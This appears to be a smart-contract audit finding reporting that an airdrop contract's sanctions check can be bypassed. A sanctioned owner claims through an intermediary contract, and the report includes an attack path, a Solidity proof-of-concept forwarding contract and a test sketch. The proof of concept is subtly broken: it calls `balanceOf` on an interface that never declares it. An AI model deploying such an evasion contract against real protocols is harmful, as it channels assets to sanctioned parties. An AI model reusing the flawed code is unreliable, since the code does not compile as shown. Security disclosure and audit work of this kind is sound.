### Title
Sanctions Check Bypassed via Intermediary Contract in `claim()` — (`core/contracts/Airdrop.sol`)

---

### Summary

`Airdrop._verifyProof` checks sanctions only against `msg.sender`. A sanctioned EOA that controls a smart contract whose address appears as a Merkle leaf can call `claim()` through that contract, pass the sanctions check (because the contract itself is not sanctioned), receive the tokens, and immediately forward them to the sanctioned EOA.

---

### Finding Description

In `_verifyProof`, the sanctions gate is:

```solidity
require(
    !ISanctionsList(sanctions).isSanctioned(sender),
    "address is sanctioned."
);
```

where `sender` is always `msg.sender`, set unconditionally in `_claim`:

```solidity
function _claim(...) internal {
    _verifyProof(week, msg.sender, totalAmount, proof);
    SafeERC20.safeTransfer(IERC20(token), msg.sender, totalAmount);
    ...
}
``` [1](#0-0) [2](#0-1) 

The Merkle leaf is `keccak256(bytes.concat(keccak256(abi.encode(sender, totalAmount))))` — nothing in the contract restricts leaves to EOA addresses. Contract addresses (multisigs, smart wallets, DAO treasuries) are valid leaves. [3](#0-2) 

Attack path:

1. EOA deploys an intermediary contract **before** the Merkle tree is published (or uses an existing smart wallet already tracked by the protocol).
2. Protocol publishes a Merkle root that includes the intermediary's address.
3. EOA is sanctioned **after** tree publication.
4. Sanctioned EOA calls `intermediary.triggerClaim()` → intermediary calls `Airdrop.claim(claimProofs)`.
5. `msg.sender` = intermediary address → `isSanctioned(intermediary)` = `false` → check passes.
6. Tokens are transferred to the intermediary.
7. Intermediary forwards tokens to the sanctioned EOA.

---

### Impact Explanation

A sanctioned principal receives airdrop token allocations they are explicitly prohibited from receiving. This breaks the protocol's compliance invariant and constitutes a direct, measurable asset transfer to a sanctioned address. The `claimed[week][intermediary]` slot is marked, so the allocation is consumed and cannot be reclaimed by the protocol.

---

### Likelihood Explanation

The preconditions are realistic:

- Smart wallets, multisigs (e.g., Gnosis Safe), and DAO treasuries are commonly included in airdrop Merkle trees when they have on-chain trading history.
- Sanctions lists are dynamic; an EOA can be added to the OFAC SDN list after a Merkle root is registered.
- The intermediary contract requires no special privileges — any contract that calls `Airdrop.claim()` and forwards the received tokens suffices.
- No admin or sequencer compromise is required.

---

### Recommendation

Add a check that the transaction originator is also not sanctioned, or restrict claims to EOA callers only:

```solidity
// Option A: also check tx.origin
require(
    !ISanctionsList(sanctions).isSanctioned(msg.sender) &&
    !ISanctionsList(sanctions).isSanctioned(tx.origin),
    "address is sanctioned."
);

// Option B: restrict to EOAs only
require(msg.sender == tx.origin, "Only EOAs may claim.");
```

Option B is simpler and eliminates the entire intermediary-contract attack surface, at the cost of preventing smart-wallet claims. If smart-wallet support is required, Option A (checking both `msg.sender` and `tx.origin`) is the appropriate mitigation.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAirdrop {
    struct ClaimProof { uint32 week; uint256 totalAmount; bytes32[] proof; }
    function claim(ClaimProof[] calldata) external;
}
interface IERC20 { function transfer(address, uint256) external returns (bool); }

contract Intermediary {
    address public owner;
    constructor() { owner = msg.sender; }

    function triggerClaim(
        address airdrop,
        IAirdrop.ClaimProof[] calldata proofs,
        address token,
        address recipient
    ) external {
        require(msg.sender == owner);
        IAirdrop(airdrop).claim(proofs);
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(recipient, bal); // forward to sanctioned EOA
    }
}

// Hardhat test sketch:
// 1. Deploy Intermediary; record its address.
// 2. Build Merkle tree with leaf = keccak256(keccak256(abi.encode(intermediary, amount))).
// 3. registerMerkleRoot(1, root) as owner.
// 4. Sanction the EOA (mock ISanctionsList returns true for EOA, false for intermediary).
// 5. EOA calls intermediary.triggerClaim(airdrop, proofs, token, EOA).
// 6. Assert: token.balanceOf(EOA) == amount  ← sanctioned EOA received tokens.
```

### Citations

**File:** core/contracts/Airdrop.sol (L53-56)
```text
        require(
            !ISanctionsList(sanctions).isSanctioned(sender),
            "address is sanctioned."
        );
```

**File:** core/contracts/Airdrop.sol (L57-62)
```text
        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(sender, totalAmount)))
        );
        bool isValidLeaf = MerkleProof.verify(proof, merkleRoots[week], leaf);
        require(isValidLeaf, "Invalid proof.");
        claimed[week][sender] = totalAmount;
```

**File:** core/contracts/Airdrop.sol (L70-71)
```text
        _verifyProof(week, msg.sender, totalAmount, proof);
        SafeERC20.safeTransfer(IERC20(token), msg.sender, totalAmount);
```
